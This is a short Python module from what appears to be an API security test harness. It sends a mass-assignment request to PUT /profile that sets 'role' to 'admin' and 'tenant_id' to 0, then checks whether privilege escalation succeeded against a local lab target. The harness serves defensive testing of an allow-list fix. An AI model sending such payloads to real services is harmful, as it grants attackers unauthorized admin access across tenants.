"""API3 -- Mass assignment / privilege escalation on PUT /profile.

The attacker submits extra fields ("role": "admin", "tenant_id": 0) the API
should never let a user set on themselves.  In insecure mode the handler binds
every supplied field, so the attacker becomes admin.  Success = GET /profile
afterwards shows role == admin.

Secure mode binds only the allow-listed field ("full_name"); privileged fields
are ignored.
"""

from __future__ import annotations

from ..client import ExploitResult, TargetClient


def run(client: TargetClient) -> ExploitResult:
    client.register("strike-mass@mirage.local")
    before = client.get("/profile").json()
    client.put(
        "/profile",
        json={"full_name": "Totally Normal", "role": "admin", "tenant_id": 0},
    )
    after = client.get("/profile").json()
    escalated = before.get("role") != "admin" and after.get("role") == "admin"
    return ExploitResult(
        vuln_id="API3",
        name="Mass assignment -> privilege escalation on /profile",
        success=escalated,
        severity="critical",
        detail="Set role=admin via an unfiltered PUT /profile body.",
        evidence=f"role before={before.get('role')} after={after.get('role')}"
        if escalated
        else "",
        blocked_reason="" if escalated else "Privileged fields rejected (allow-list).",
    )
